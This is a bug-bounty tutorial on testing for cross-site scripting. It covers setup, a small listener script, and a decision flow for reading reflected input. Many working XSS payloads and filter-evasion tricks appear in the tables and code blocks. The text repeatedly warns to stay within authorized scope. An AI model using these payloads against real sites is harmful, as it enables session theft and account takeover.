# Cross-Site Scripting (XSS) — Complete In-Depth Testing Guide (Expert / Bug-Bounty & Red-Team Edition)

**Author:** x8bitranjit
**Scope:** Web apps, SPAs (React/Angular/Vue), APIs that render, mobile WebViews, admin panels, email/HTML rendering surfaces
**Platforms:** Windows + Kali/Linux commands provided for everything
**Companion files in this folder:**
- `XSS_PAYLOAD_ARSENAL.md` — the curated payload library (contexts, WAF/CSP bypass, polyglots, blind, framework)
- `XSS_TESTING_CHECKLIST.md` — the testing-order checklist you tick through per target
- `XSS_REPORT_TEMPLATE.md` — the report skeleton that gets paid
- `poc/` — ready-to-use impact PoC scripts (cookie/token exfil, blind XSS, keylogger, ATO, internal scan)

> **How this guide is structured.** Parts I–III are *find* (recon → context → execution); Parts IV–V are *get paid* (impact → severity → report). The core lesson — **report impact, not a condition** — is more brutal for XSS than almost any bug, because `alert(1)` is a *condition*: triagers see a thousand `alert(1)` screenshots a week. What separates a $50 (or $0 "informative") report from a $5k one is the **escalation** you put under it. Read Part IV before you spend a week fuzzing.

---

> ### ⚡ READ THIS FIRST — why most XSS reports underpay (or get closed)
> 1. **`alert(document.domain)` is the *start*, not the finding.** Proving JS executes is the proof-of-concept; the *finding* is what that JS lets you steal or do — session, account, admin, money, other users. A reflected `alert` on a logged-out marketing page is Low/Info. The *same bug* that steals a session cookie and demonstrates account takeover is High/Critical. See **§24–§33**.
> 2. **Self-XSS is not a vulnerability.** If the only person who can trigger it is the victim typing into their own console / their own field with no cross-user delivery, it is **auto-closed**. You must show *delivery* (a URL, a stored value another user renders, a request you can force). See **§35**.
> 3. **CSP can downgrade or kill your bug — test it early.** A perfect injection behind a strict `script-src` that actually blocks execution may be Info. Conversely, a *bypassable* CSP is its own finding. Read the response's `Content-Security-Policy` before you celebrate. See **§19**.
> 4. **Context is everything.** The *same* string is harmless in one context and RCE-in-the-browser in another. You cannot pick a payload until you know whether you landed in HTML body, an attribute, a `<script>` block, a URL, CSS, or a JS template literal. See **§3, §5–§10**.
> 5. **Stored > Reflected > Self; 0-click > 1-click > needs-victim-interaction; admin-context > user-context > self.** Memorize this ladder — it *is* the severity model (**§36**).
>
> **Where the money is (memorize this order):** ① **stored XSS that fires in another user's / an admin's authenticated session** (0-click, mass impact, sometimes wormable) → ② **reflected XSS that chains to account takeover** (cookie/token theft, CSRF-token theft → email/password change) → ③ **DOM XSS in a sensitive authenticated flow** (often CSP- and WAF-bypassing because it never hits the server) → ④ **blind XSS landing in an internal admin/support tool** → ⑤ *then* low-context reflected XSS, CSP weaknesses, and self-XSS chains as **enablers/Low**, not headliners.

---

## Table of Contents

**▶ [Master Testing Sequence — the testing order](#master-testing-sequence--the-testing-order)** — follow this top-to-bottom; jump into the numbered sections for detail.

**PART I — FOUNDATIONS, RECON & DETECTION**
1. [Environment & Tooling Setup](#1-environment--tooling-setup)
2. [XSS Taxonomy — Which Type Pays, and Why](#2-xss-taxonomy--which-type-pays-and-why)
3. [The Source → Sink → Context Model](#3-the-source--sink--context-model)
4. [Reconnaissance — Mapping the Injection Surface](#4-reconnaissance--mapping-the-injection-surface)
5. [Reflection Detection & Context Identification](#5-reflection-detection--context-identification)

**PART II — EXPLOITATION BY CONTEXT (work in this order)**
6. [HTML Body Context](#6-html-body-context)
7. [HTML Attribute Context](#7-html-attribute-context)
8. [JavaScript Context (inline script, events, template literals)](#8-javascript-context)
9. [URL / `href` / `src` Context (`javascript:`, `data:`)](#9-url--href--src-context)
10. [CSS Context](#10-css-context)
11. [DOM-Based XSS — Source-to-Sink Tracing](#11-dom-based-xss--source-to-sink-tracing)
12. [Stored / Persistent XSS & Second-Order](#12-stored--persistent-xss--second-order)
13. [Blind XSS — Out-of-Band Delivery](#13-blind-xss--out-of-band-delivery)
14. [Mutation XSS (mXSS) & Sanitizer Bypass](#14-mutation-xss-mxss--sanitizer-bypass)
15. [Framework-Specific XSS (Angular/React/Vue/template injection)](#15-framework-specific-xss)
16. [File-Based XSS — SVG, PDF, Markdown, filenames, CSV→formula](#16-file-based-xss)
17. [Polyglots & Multi-Context Payloads](#17-polyglots--multi-context-payloads)

**PART III — DEFENSE BYPASS & ADVANCED**
18. [WAF & Filter Bypass](#18-waf--filter-bypass)
19. [CSP Analysis & Bypass](#19-csp-analysis--bypass-the-big-one)
20. [Encoder / Sanitizer Deep-Dive Bypass](#20-encoder--sanitizer-deep-dive-bypass)
21. [Length-Limited & Character-Restricted XSS](#21-length-limited--character-restricted-xss)
22. [Charset / Encoding / mXSS-charset Tricks](#22-charset--encoding-tricks)

**PART IV — IMPACT (where the money is)**
23. [The Escalation Mindset — from `alert(1)` to a payout](#23-the-escalation-mindset)
24. [Session & Cookie Theft](#24-session--cookie-theft)
25. [Token / localStorage / sessionStorage Theft](#25-token--localstorage--sessionstorage-theft)
26. [CSRF-Token Theft → Forced Actions → 0-click ATO](#26-csrf-token-theft--forced-actions--0-click-ato)
27. [Account Takeover Chains (email/password/OAuth)](#27-account-takeover-chains)
28. [Credential Harvesting & In-Origin Phishing](#28-credential-harvesting--in-origin-phishing)
29. [Keylogging & Form Capture](#29-keylogging--form-capture)
30. [Browser Hooking with BeEF (red team)](#30-browser-hooking-with-beef-red-team)
31. [SSRF-via-XSS, Internal Port Scan & Network Pivot](#31-ssrf-via-xss-internal-recon--pivot)
32. [Admin-Panel Stored XSS & Privilege Escalation](#32-admin-panel-stored-xss--privilege-escalation)
33. [Wormable / Self-Propagating XSS](#33-wormable--self-propagating-xss)

**PART V — VALIDITY, SEVERITY & REPORTING (the bug-bounty layer)**
34. [The Validity-First Mindset for XSS](#34-the-validity-first-mindset-for-xss)
35. [False Positives — STOP reporting these](#35-false-positives--stop-reporting-these-auto-reject-list)
36. [Severity Calibration — how triagers really rate XSS](#36-severity-calibration--how-triagers-really-rate-xss)
37. [Impact-Escalation Playbooks — "you found X, now do Y"](#37-impact-escalation-playbooks--you-found-x-now-do-y)
38. [Building a Professional, Safe PoC](#38-building-a-professional-safe-poc)
39. [Reporting, CWE/CVSS & De-duplication](#39-reporting-cwecvss--de-duplication)
40. [Red-Team Notes — OPSEC, Staging & Persistence](#40-red-team-notes)
41. [Automation & Scaling](#41-automation--scaling)
42. [Case Studies & Real-World Chains](#42-case-studies--real-world-chains)

**Appendices**
- [Appendix A — XSS Workflow Cheat Sheet](#appendix-a--xss-workflow-cheat-sheet)
- [Appendix B — Context Decision Tree](#appendix-b--context-decision-tree)
- [Appendix C — Important Links](#appendix-c--important-links)

---

# Master Testing Sequence — The Testing Order

> **This is the spine of the whole guide.** Work it top-to-bottom. Each phase says *what to do*, *which § to open for detail*, and the *deliverable* that feeds the next phase. The numbered sections (1–42) are the reference detail you jump into; this sequence is the order you actually execute. For a fast version, see the cheat sheet in **Appendix A**.

```
PHASE 0  AUTHORIZATION & LAB     → confirm scope/RoE · build proxy+browser lab (§1) · stand up an OOB listener (§13)
PHASE 1  RECON & SURFACE MAP     → crawl, collect every param/header/path/JSON field/sink (§4)
                                    fingerprint stack + framework + CSP + WAF (§1,§15,§18,§19)
PHASE 2  REFLECTION & CONTEXT    → fire a unique marker into EVERY input; find where it lands and in WHAT context (§5)
PHASE 3  CONTEXT EXPLOITATION    → break out of the exact context you landed in (§6–§10 by context;
                                    §11 DOM · §12 stored · §13 blind · §14 mXSS · §15 framework · §16 files)
PHASE 4  DEFENSE BYPASS          → if blocked: WAF (§18) · CSP (§19) · sanitizer/encoder (§20) ·
                                    length/charset limits (§21,§22). Confirm execution, not just injection.
PHASE 5  IMPACT  ⭐ (the money)   → turn execution into theft/takeover: cookies (§24) · tokens (§25) ·
                                    CSRF-token→ATO (§26) · full ATO chains (§27) · phishing/keylog (§28,§29) ·
                                    BeEF (§30) · internal recon (§31) · admin/priv-esc (§32) · worm (§33)
PHASE 6  VALIDATE → SEVER → REPORT→ validity (§34) · false-positive filter (§35) · severity (§36) ·
                                    professional PoC (§38) · CWE/CVSS + dedup (§39) · report template
```

**Phase-by-phase, with the deliverable that must exist before you move on:**

1. **PHASE 0 — Authorization & lab.** Read the program scope/rules first — XSS is *active* testing and an out-of-scope or destructive PoC (real cookie exfil of *real* users, defacement, mass-firing a stored payload other users see) can be *invalid and illegal*. Build the lab (**§1**): Burp/Caido, two browsers, an HTTP collaborator/listener for blind & exfil (**§13**). *Deliverable:* legal scope + working proxy + a live OOB listener URL.
2. **PHASE 1 — Recon & surface map.** Crawl every page, collect **every** sink: query params, POST body fields, JSON keys, path segments, headers (`Referer`, `User-Agent`, `X-Forwarded-*`, `Origin`), cookies, file uploads, WebSocket frames, `postMessage`. Fingerprint the framework, the **CSP**, and the **WAF** (**§4, §15, §18, §19**). *Deliverable:* a parameter/sink inventory + stack/CSP/WAF notes.
3. **PHASE 2 — Reflection & context.** Inject a unique non-HTML marker (e.g. `zqxj9`) into *every* input and find where it echoes — in the HTML body, an attribute, a `<script>`, a URL, CSS, or via the DOM only. The context **dictates the payload** (**§5**). *Deliverable:* a map of reflections → contexts.
4. **PHASE 3 — Context exploitation.** For each reflection, break out of *that exact context* (**§6–§10**), or trace the DOM source→sink (**§11**), confirm persistence (**§12**), set blind payloads where output is invisible (**§13**), and try framework/sanitizer/file vectors (**§14–§16**). *Deliverable:* confirmed **JS execution** (not just injection) — your PoC trigger.
5. **PHASE 4 — Defense bypass.** Where a marker reflects but the payload is blocked, bypass WAF (**§18**), CSP (**§19**), sanitizer/encoder (**§20**), and length/charset limits (**§21, §22**). *Deliverable:* execution that survives the app's defenses, on the **production** config.
6. **PHASE 5 — Impact ⭐ (where the money is).** Escalate execution into demonstrable harm: steal a session (**§24**) or token (**§25**); steal a CSRF token and force a state change → 0-click ATO (**§26**); chain to email/password/OAuth takeover (**§27**); harvest creds / keylog (**§28, §29**); hook with BeEF for red-team (**§30**); pivot to internal services (**§31**); land in an admin panel for priv-esc / worm (**§32, §33**). *Deliverable:* the payable impact (ATO, cross-user/admin data theft, money, mass effect).
7. **PHASE 6 — Validate → severity → report.** Apply the validity & false-positive filters (**§34, §35**), set a defensible CVSS/severity (**§36**), build a clean *safe* PoC (**§38**), map one CWE, de-dup, and write it up with the template (**§39**). *Deliverable:* the submitted report.

Reference anytime: payloads → `XSS_PAYLOAD_ARSENAL.md`; checklist → `XSS_TESTING_CHECKLIST.md`; impact scripts → `poc/`; escalation playbooks **§37**; case studies **§42**.

---

# PART I — FOUNDATIONS, RECON & DETECTION

# 1. Environment & Tooling Setup

## 1.1 Core toolchain

| Tool | Purpose | Get it |
|------|---------|--------|
| **Burp Suite** (Pro ideal) | Intercept, Repeater, Intruder, **DOM Invader**, collaborator | https://portswigger.net/burp |
| **Caido** | Lighter modern proxy alternative | https://caido.io |
| **Browsers ×2** | One "victim" (logged in), one "attacker"; use separate profiles | Chrome + Firefox |
| **DOM Invader** (in Burp's browser) | Auto source→sink tracing for DOM XSS | Bundled with Burp |
| **interactsh / Burp Collaborator** | OOB callback for blind XSS & exfil | https://github.com/projectdiscovery/interactsh |
| **XSS Hunter (self-host)** | Blind-XSS payload mgmt + screenshot/DOM capture | https://github.com/mandatoryprogrammer/xsshunter-express |
| **Dalfox** | Fast parameter XSS scanner/verifier | https://github.com/hahwul/dalfox |
| **kxss / Gxss** | Find which params reflect unfiltered chars | https://github.com/Emoe/kxss |
| **waybackurls / gau / katana** | Harvest historical params & endpoints | ProjectDiscovery / tomnomnom |
| **Arjun / param-miner** | Discover hidden parameters | https://github.com/s0md3v/Arjun |
| **XSStrike** | Context-aware payload generation + WAF detect | https://github.com/s0md3v/XSStrike |
| **Knockout/Knoxss** (paid) | High-quality automated XSS confirmation | https://knoxss.me |
| **retire.js / wappalyzer** | Fingerprint vulnerable JS libs & framework | Browser extensions |
| **CSP Evaluator** | Score a CSP for bypassability | https://csp-evaluator.withgoogle.com |
| **JSBeautifier / source maps** | De-minify SPA bundles to find sinks | online / `js-beautify` |

```powershell
# Windows (PowerShell) — installs
pip install arjun
go install github.com/hahwul/dalfox/v2@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/tomnomnom/gf@latest
go install github.com/KathanP19/Gxss@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
git clone https://github.com/s0md3v/XSStrike  # python xsstrike.py
```

```bash
# Kali / Linux — same, plus
sudo apt install -y nodejs npm
npm i -g js-beautify
pipx install arjun xsstrike
```

## 1.2 The two-browser / two-account rule

XSS impact is about **one user attacking another**. You almost always need:
- **Victim profile/account** — logged in, the session you want to prove you can steal/abuse.
- **Attacker profile/account** — where you plant stored payloads and host your exfil.

Use **separate browser profiles** (or browsers) so cookies don't bleed. For stored-XSS impact you frequently need a **second, lower-privileged or different** account whose payload an admin/another user will render — that's where the severity is.

## 1.3 Stand up an OOB listener (do this in Phase 0)

You need a callback endpoint *before* you start, for blind XSS and for exfil PoCs.

```bash
# Quick: Burp Collaborator (Pro) → "Copy to clipboard" a unique subdomain
# OR interactsh (free):
interactsh-client -v
# gives you e.g.  c8f2....oast.fun  — every DNS/HTTP hit is logged with source IP + payload

# OR a dumb logging server you control (for exfil PoC):
python3 -m http.server 8000          # then ngrok/Cloudflare-tunnel to expose
# OR a one-file logger that records querystrings:
```
```python
# poc-listener.py — minimal exfil sink you control (authorized testing only)
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def _log(self):
        print(f"[HIT] {self.client_address[0]} {self.path}")
        print(f"      Headers: {dict(self.headers)}")
        self.send_response(200); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers(); self.wfile.write(b"1")
    do_GET = do_POST = _log
HTTPServer(("0.0.0.0", 8000), H).serve_forever()
```
> For real programs, prefer **Burp Collaborator / interactsh / self-hosted XSS Hunter** — they log source IP, full request, and (XSS Hunter) a screenshot + DOM, which is exactly the evidence triagers want. **Never exfil real users' live data** — exfil your *own* test account's marker. See **§38**.

## 1.4 Fingerprint before you fuzz (5 minutes that save hours)

```
□ Framework / templating  → Wappalyzer, retire.js, response headers, JS bundle names (react/angular/vue/jquery/handlebars)
□ CSP                      → read the Content-Security-Policy header (or <meta>). Strict? nonce/hash? unsafe-inline? (§19)
□ WAF                      → Cloudflare / Akamai / AWS WAF / Imperva fingerprints; send a loud payload, watch for 403/406 (§18)
□ Output encoding library  → does it HTML-encode < > " '? URL-encode? JSON-encode? (tells you what to break out of)
□ Cookies                  → HttpOnly? Secure? SameSite? (decides cookie-theft vs token-theft path, §24/§25)
□ Auth model               → cookie session vs Bearer in localStorage vs OAuth (decides §25 vs §24 escalation)
```

---

# 1.9 XSS Fundamentals — what's *actually* happening (read this first if you're learning)

> Skip if you're already fluent. If you want to be an expert, internalize this — every later trick is just a
> consequence of these five facts. Each says **what it is**, **why it matters**, and the **rule** you'll reuse.

**(1) What XSS actually is.** The browser turns the HTML it receives into a **DOM** (a tree of elements), and runs any
**JavaScript** it finds (in `<script>`, in `on*=` handlers, in `javascript:` URLs). XSS happens when **your input ends
up being parsed as part of that HTML/JS** instead of being treated as plain text — so the browser **executes your
code**. *Rule: XSS = your data crossed the line from "data" to "code" in the victim's browser.*

**(2) The Origin & why running code there is game-over.** An **origin** = scheme + host + port (`https://app.target.com`).
The **Same-Origin Policy** isolates origins, but **code that runs *inside* an origin can do anything a user of that
origin can**: read the page, read `document.cookie` (if not HttpOnly), read tokens from `localStorage`, and make
**authenticated requests** with the victim's cookies (`fetch(..., {credentials:'include'})`). *Rule: XSS in
`target.com` = you ARE the victim on `target.com` → that's why it leads to account takeover.*

**(3) Injection ≠ Execution.** Seeing your input **reflected** in the response is NOT XSS. The browser must **parse it as
code**. If your `<` comes back as `&lt;` (HTML-encoded), or your value sits inside a correctly-quoted attribute, it's
**inert text** — it does nothing. *Rule: the finding is a **firing** `alert(document.domain)` (or an OOB beacon), never
a reflected string.*

**(4) Context is everything — what "context" means.** "Context" = **exactly where your data lands in the output**, because
the breakout characters differ per place:
- In **HTML body** (`<p>HERE</p>`) you need `<` to start a tag.
- In a **quoted attribute** (`value="HERE"`) you need `"` to close the quote first.
- In a **`<script>` string** (`var x="HERE"`) you need `"` + `;` to break the JS string — **no `<` needed** (you're
  already in JS).
- In a **URL** (`href="HERE"`) you need a `javascript:` scheme, not a tag.
*Rule: identify the context, THEN pick the breakout. Firing `<script>alert(1)</script>` everywhere is the #1 beginner
mistake — it's inert inside an attribute or a JS string.*

**(5) Encoding — the defense you're fighting, and why it's context-specific.** "Output encoding" means the app converts
dangerous characters to harmless entities **for a specific context**: HTML-encoding makes `<`→`&lt;` `"`→`&quot;`;
JS-encoding escapes quotes in strings; URL-encoding percent-escapes. The bug is almost always **the app encoded for the
wrong context** (it HTML-encoded a value that lands inside a `<script>` string, where `&quot;` doesn't help and a raw
`"` still breaks out — or vice-versa). *Rule: a value encoded correctly for one context is frequently exploitable in
another — that mismatch is the bug.*

> **Becoming expert = doing this every time:** *find where my data lands (context) → see which characters survived the
> encoding (probe) → break out of THAT context with the survivors → confirm execution → escalate to impact.* The rest
> of this guide is that loop, in depth.

---

# 2. XSS Taxonomy — Which Type Pays, and Why

| Type | Where the payload lives | Who triggers it | Typical bounty weight |
|------|------------------------|-----------------|------------------------|
| **Stored / Persistent** | Saved server-side, rendered later to others | **Other users / admins, 0-click** | ★★★★★ highest — mass, 0-click, often admin |
| **Reflected** | In the request, echoed in the immediate response | Victim must open *your* crafted URL (1-click) | ★★★☆ medium — depends on the ATO chain |
| **DOM-based** | Never touches server response body; sink in client JS | Victim opens URL / state; can be 0- or 1-click | ★★★★ medium-high — often bypasses CSP/WAF |
| **Blind** | Stored, fires in a UI you *can't* see (admin/support/logs) | An internal user, later | ★★★★ high — lands in privileged context |
| **Self-XSS** | Victim must paste into their *own* session | Only the victim, on themselves | ☆ **not a vuln alone** (§35) — only via a chain |
| **Mutation (mXSS)** | Sanitized HTML mutates to executable after re-parse | Whoever renders it | ★★★★ high — defeats DOMPurify/sanitizers |
| **Universal (uXSS)** | Browser/extension bug, runs across origins | Victim | ★★★★★ (browser-vendor scope, not app scope) |

**The decision that sets your severity:** *who runs the script, in whose session, and with how much interaction.*
- **Stored, fires in an admin's authenticated session, 0-click** = the jackpot (mass ATO / full compromise, sometimes wormable).
- **Reflected, needs the victim to click your link while logged in** = real but 1-click; severity rides on the **ATO chain** you build (**§26–§27**).
- **DOM XSS** frequently **bypasses server-side WAF and even some CSP** because the dangerous write happens entirely client-side — undervalued and worth hunting.

---

# 3. The Source → Sink → Context Model

Every XSS is: **attacker-controlled data (source)** flows into an **execution point (sink)** rendered in a **context** that lets it run as code.

## 3.1 Sources (where attacker data enters)
- **Server-reflected:** URL query/path, POST body, headers (`Referer`, `User-Agent`, `X-Forwarded-Host`, `Origin`, `Cookie`), uploaded filenames/content.
- **DOM sources (client-side):** `location.href / .search / .hash / .pathname`, `document.referrer`, `document.cookie`, `window.name`, `postMessage` `event.data`, `localStorage`/`sessionStorage`, `WebSocket` messages, `URLSearchParams`.

## 3.2 Sinks (where data becomes execution)

**Server-side render sinks:** any template/echo that doesn't context-correctly encode.

**DOM/JS sinks (memorize — these are your DOM-XSS targets):**
```
HTML-writing:   innerHTML, outerHTML, insertAdjacentHTML, document.write, document.writeln,
                $(...).html(), $(...).append/prepend/before/after, Range.createContextualFragment
JS-executing:   eval, setTimeout(string), setInterval(string), Function(), execScript,
                new Function, location=, location.href=, location.assign/replace, window.open
attribute/url:  element.src/href = (javascript:), setAttribute('href'/'src'/'on*', ...),
                a.href, iframe.src, script.src, embed.src, object.data
framework:      Angular ng-bind-html / $sce, React dangerouslySetInnerHTML, Vue v-html,
                Handlebars/Mustache triple-stache {{{ }}}, jQuery.parseHTML, jQuery.globalEval
```

## 3.3 The seven contexts (this decides the payload)
A reflected marker can land in exactly one of these — your breakout differs for each:

| # | Context | Example output of `MARKER` | What you must do to execute |
|---|---------|---------------------------|------------------------------|
| 1 | **HTML body** | `<p>MARKER</p>` | inject a tag: `<svg onload=...>` (**§6**) |
| 2 | **HTML tag attribute (quoted)** | `<input value="MARKER">` | close the quote+tag or add an event handler (**§7**) |
| 3 | **HTML tag attribute (unquoted)** | `<input value=MARKER>` | space + `onmouseover=...` (**§7**) |
| 4 | **Inside `<script>`** | `var x = "MARKER";` | break the string/statement: `";alert(1)//` (**§8**) |
| 5 | **JS event / `href`** | `<a href="MARKER">` | `javascript:alert(1)` (**§9**) |
| 6 | **CSS / `style`** | `<div style="color:MARKER">` | rarely direct exec; exfil/`expression()` legacy (**§10**) |
| 7 | **DOM-only** (not in source) | nothing in HTML; appears after JS runs | trace the sink (**§11**) |

> **The single most common beginner mistake:** firing `<script>alert(1)</script>` into *every* field. If you're inside an attribute or a `<script>` string, that payload is inert text. **Identify the context (§5) first, then pick the breakout.**

## 3.4 The probe-result decision flow — "if I injected THIS and got back THAT, do THIS"
This is the heart of testing: inject the probe **`xss7f3a9'"<>(){}`** (a unique tag + the breakout characters), look at
the **raw response / DOM** around your marker, and follow the branch. *Always read the bytes immediately before and
after your marker — they ARE the context.*

```
STEP A — Where did `xss7f3a9` land? (Ctrl-F the raw response AND the live DOM)
  • Found in the raw server HTML            → reflected/stored (server-side). Go to STEP B.
  • NOT in raw HTML, but in the live DOM    → DOM-based (client JS wrote it). Go to STEP D.
  • Nowhere visible                          → it may render elsewhere (stored/blind) → plant an OOB beacon (§13) and
                                               load every place the field is shown.

STEP B — Which of my probe characters came back RAW (not encoded)?  (look at ' " < > )
  • `<` and `>` came back RAW, between tags  → HTML BODY context → inject a tag: <svg onload=alert(document.domain)> (§6).
  • `<`/`>` are ENCODED (&lt; &gt;) but I'm  → you're inside an ATTRIBUTE or <script>. Go to STEP C — the quote is your way out.
    not sure where
  • Everything is encoded (&lt; &quot; ...)  → strong HTML-context encoding. DON'T fight it in HTML — pivot:
                                               try a JS-string context (§8), a javascript:/data: URL context (§9), a
                                               DOM sink via #fragment (§11, skips server encoding), or CSTI {{ }} (§15).

STEP C — I'm inside a tag. What encodes, what doesn't?
  • In  value="xss7f3a9"  and `"` came back  → QUOTED ATTRIBUTE, breakout works → "><svg onload=alert(1)> (§7.1).
    RAW
  • The `"` is encoded (&quot;) but `>` is   → can't close the quote → STAY IN THE TAG, add an event attribute:
    raw                                        " autofocus onfocus=alert(1) x="  → if even that's encoded, pivot (STEP B last).
  • In  value=xss7f3a9  (no quotes)          → UNQUOTED ATTRIBUTE → space + handler: x onmouseover=alert(1) (§7.2).
  • In  onclick="...xss7f3a9..."             → JS-IN-ATTRIBUTE → break the JS string (entities decode here):
                                               ');alert(1)//  or  &#39;);alert(1)// (§7.3).
  • In  <script> ... "xss7f3a9" ... </script>→ JS STRING → break the string: ";alert(1)//  ';alert(1)//  (§8).
                                               (If `</script>` survives, just do </script><svg onload=alert(1)>.)
  • In  href="xss7f3a9"                       → URL CONTEXT → javascript:alert(document.domain) (§9).

STEP D — DOM-based: which SOURCE flows to which SINK?  (use DOM Invader / set a breakpoint on the sink, §11)
  • #fragment → innerHTML/document.write     → #<img src=x onerror=alert(document.domain)> (never hits the server — WAF-proof).
  • ?param   → location/href                  → ?next=javascript:alert(1).
  • postMessage event.data → innerHTML, NO    → cross-origin DOM XSS: frame the page and postMessage a payload (§14/§11).
    origin check
  • a recursive-merge / qs.parse sink         → test prototype pollution: #__proto__[innerHTML]=<img ...> (§14).

STEP E — A marker reflects but my PAYLOAD is blocked (200 with the tag stripped / a WAF 403)?
  • Tag/attr partially stripped               → enumerate what SURVIVES (which tags/events the filter misses) — that's the
                                               bypass (§20). Try <svg>/<math>/<details> when <script> is gone.
  • WAF 403 on the payload                     → evade: case/encoding/keyword-split/no-parens/no-space, or move the
                                               injection to a header/JSON/the #fragment the WAF can't see (§18).
  • It runs but CSP blocks the script          → CSP bypass: JSONP on an allowed host / script gadget / <base> / nonce
                                               reuse / dangling-markup exfil (§19).
  • Sanitizer (DOMPurify) cleans it            → match the version → mXSS / namespace bypass (§14/§20).

STEP F — It executes (alert(document.domain) fired). NOW WHAT? (this is the actual finding)
  • Cookie not HttpOnly                        → steal document.cookie → replay → ATO (§24).
  • Cookie HttpOnly                            → still ATO: read the CSRF token via same-origin fetch → change email →
                                               password reset → ATO (§26). (HttpOnly does NOT stop XSS→ATO.)
  • Token in localStorage / the DOM           → exfil it → ATO (§25).
  • Stored + viewed by an admin/support user   → 0-click admin-context XSS → privilege escalation (§12/§13) = Critical.
```
> **Use this flow every time.** It turns "I'll throw payloads and hope" into "I read what came back, so I know exactly
> which breakout and which escalation to use." That diagnostic habit is the difference between a beginner and an expert.

## 3.4.1 Character-by-character — inject ONE character, read what it became, then approach
This is the most fundamental skill. Inject each breakout character **on its own** (`<` , then `>` , then `"` , then `'`
, …) and look at the **raw HTTP response** (Burp) **and** the **live DOM** (DevTools → Inspect). What the character
*turned into* tells you exactly what's possible. Here is every common outcome and the approach.

### Injecting `<` (the make-or-break character for HTML/tag injection)
```
What you see for `<`                          What it MEANS                         How to APPROACH
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
You injected `<u>test</u>` (or `<br>`) and    HTML IS RENDERED — your `<` started a  HTML BODY context, TAGS WORK →
the text became underlined / a line break,    REAL tag (the browser built a DOM      inject an executing tag:
OR DevTools shows a real <u>/<br> element     element from your input).              <svg onload=alert(document.domain)>
                                              The #1 "we have XSS" signal.           <img src=x onerror=alert(document.domain)>
You injected `<xss7f3a9>` and DevTools shows   Same — tags are parsed (even unknown   Same as above. (An unknown tag in the
a real (empty/unknown) <xss7f3a9> element      ones become elements).                 DOM = raw `<` reached the parser.)
Raw `<` in the response, sitting as TEXT       `<` survived unencoded but is in a     You're likely in <textarea>/<title>/
between tags but NOT forming an element        raw-text/RCDATA element or a JS string.<script>/comment — CLOSE that context
(e.g. inside <textarea>…<…)                                                          first: </textarea><svg onload=…> ,
                                                                                     </title>… , </script>… , -->… (§3.4 STEP C)
Came back as `&lt;`  (or `&#60;` / `&#x3c;`)   HTML-ENCODED. Inert as HTML — the      DON'T fight HTML here. PIVOT:
                                              browser shows a literal "<", no tag.   • are you in a <script> string? → break
                                                                                       the JS string, no `<` needed: ";alert(1)//
                                                                                     • in a quoted attribute? → break the quote:
                                                                                       "><svg onload=…>  (the `"` may be raw even
                                                                                       when `<` is encoded — test it!)
                                                                                     • DOM sink via #fragment (server encoding
                                                                                       doesn't apply client-side) → §11
                                                                                     • CSTI {{ }} (Angular) runs with `<` encoded
`<` is STRIPPED / removed entirely             A tag/`<` blacklist or stripper.       Try partials & alternates: `<svg`, `<img`,
                                                                                     mixed case `<ScRiPt`, `<%00script`, nested
                                                                                     `<scr<script>ipt>` (strip-once re-assembly,
                                                                                     §18). If `<...>` PAIRS are stripped, an open
                                                                                     `<svg onload=…` (no closing `>`) sometimes runs.
`<` appears as literal `%3C` in the page       Double-/mis-decoding. The app didn't   Try the matching decode layer: send `%3C`
                                              decode once where you expected.        (or `%253C`) so it decodes to `<` in the sink.
```

### Injecting `>`
```
Raw `>`                                        you can CLOSE a tag                    finish your breakout: "><svg onload=…>
`&gt;` (encoded) but `"`/`'` is raw            can't close the tag from inside an     STAY IN THE TAG, add an event attribute:
                                              attribute                              " autofocus onfocus=alert(1) x="
```

### Injecting `"` and `'` (the attribute / JS-string breakout)
```
`"` raw inside  value="xss7f3a9"               QUOTED ATTRIBUTE — breakout works      "><svg onload=alert(1)>   (or close-then-attr)
`'` raw inside  value='xss7f3a9'               single-quoted attribute                '><svg onload=alert(1)>
`"`/`'` came back `&quot;`/`&#39;`/`&#34;`      the quote is ENCODED — you can't close it→ if UNQUOTED attr: add a handler w/o quotes
                                                                                     (x onmouseover=alert(1)); else pivot (§3.4)
`"` came back as  \"  (backslash-escaped)      you're in a JS STRING that escapes     try escaping the escape: inject `\` →
   inside <script> var x="…\"…"                quotes                                 `\";alert(1)//`  (your `\` makes their `\"`
                                                                                     into `\\"`, freeing your `"` to break out)
`"` came back DOUBLED  ""                       the app doubles quotes (CSV/some       backslash/entity tricks; often a dead end in
                                              templating)                            HTML — pivot to another context
in  onclick="…'xss7f3a9'…"  and the `'`/`"`    JS-IN-ATTRIBUTE — HTML entities DECODE  ');alert(1)//   or   &#39;);alert(1)//
   you need is HTML-encoded                    here before JS runs                    (the &#39; becomes ' at parse time → breaks out)
```

### Injecting `(` `)` , backtick `` ` `` , `;` , `=` , space, `/` , `{` `}` , `:`
```
`(` `)` STRIPPED/blocked        → call without parentheses:  alert`1`  ·  onerror=alert`document.domain`  ·  throw onerror=alert;1
backtick `` ` `` survives        → template literal / no-parens:  `${alert(1)}`  ·  setTimeout`alert\x281\x29`
`;` available (JS context)       → terminate the statement:  ";alert(1)//   (without `;`, chain with `-`/`+`:  "-alert(1)-")
`=` blocked (attribute)          → some parsers accept  onerror&#61;alert(1)  or whitespace/newline before `=`
SPACE blocked (between attrs)    → use `/` or a newline/tab:  <svg/onload=alert(1)>  ·  <img/src/onerror=alert(1)>
`/` blocked                      → many vectors don't need it ( <svg onload=…> ) ; for paths use it via the sink
`{` `}` survive + framework      → test CSTI:  {{constructor.constructor('alert(document.domain)')()}}  (Angular, §15)
`:` blocked in javascript:       → java%0ascript:alert(1)  ·  java%09script:  ·  JaVaScRiPt:  (case/whitespace in the scheme)
```

### The meta-rule for reading any character
- **Raw / unchanged** → that character is a *weapon you have* in this context.
- **HTML-encoded (`&lt;` `&quot;` `&#39;`)** → blocked *for HTML*, but **(a)** it may still be raw in a *different* context
  (test each character separately!), and **(b)** entities **decode** inside event-handler attributes and some sinks — so an
  encoded quote can still break out of JS-in-an-attribute.
- **Backslash-escaped (`\"`)** → you're in a JS string with escaping → attack the **backslash** (`\` injection).
- **Stripped/removed** → a blacklist → try **alternates** (other tags/events), **mixed case**, **nesting**
